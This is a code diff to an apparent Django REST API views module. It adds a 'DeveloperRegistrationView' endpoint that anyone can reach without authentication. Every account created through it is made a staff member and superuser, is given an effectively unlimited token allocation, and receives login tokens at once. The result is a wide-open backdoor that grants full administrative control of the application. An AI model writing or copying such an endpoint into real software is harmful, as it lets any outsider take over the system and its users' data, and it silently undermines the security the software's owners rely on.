@@ -52,6 +52,44 @@ class UserRegistrationView(generics.CreateAPIView):
     def options(self, request, *args, **kwargs):
         return Response({'status': 'ok'}, status=status.HTTP_200_OK)
 
+class DeveloperRegistrationView(generics.CreateAPIView):
+    """Isolated registration for developers."""
+    queryset = User.objects.all()
+    serializer_class = UserRegistrationSerializer
+    permission_classes = [permissions.AllowAny]
+
+    def create(self, request, *args, **kwargs):
+        try:
+            email = request.data.get('email')
+            logger.info("DeveloperRegistrationView: developer registration attempt", extra={"email": email})
+            
+            serializer = self.get_serializer(data=request.data)
+            if not serializer.is_valid():
+                return Response({
+                    'error': 'Registration failed',
+                    'details': serializer.errors
+                }, status=status.HTTP_400_BAD_REQUEST)
+                
+            user = serializer.save()
+            
+            # Grant developer privileges explicitly
+            user.tokens_allocated = 999999999
+            user.is_staff = True
+            user.is_superuser = True
+            user.save()
+            
+            logger.info("DeveloperRegistrationView: developer user created", extra={"email": user.email})
+            
+            refresh = RefreshToken.for_user(user)
+            return Response({
+                'user': UserSerializer(user).data,
+                'refresh': str(refresh),
+                'access': str(refresh.access_token),
+            }, status=status.HTTP_201_CREATED)
+        except Exception as e:
+            logger.exception("DeveloperRegistrationView: error")
+            return Response({'error': 'Registration failed', 'details': str(e)}, status=status.HTTP_400_BAD_REQUEST)
+
 class UserLoginView(APIView):
     permission_classes = [permissions.AllowAny]
 
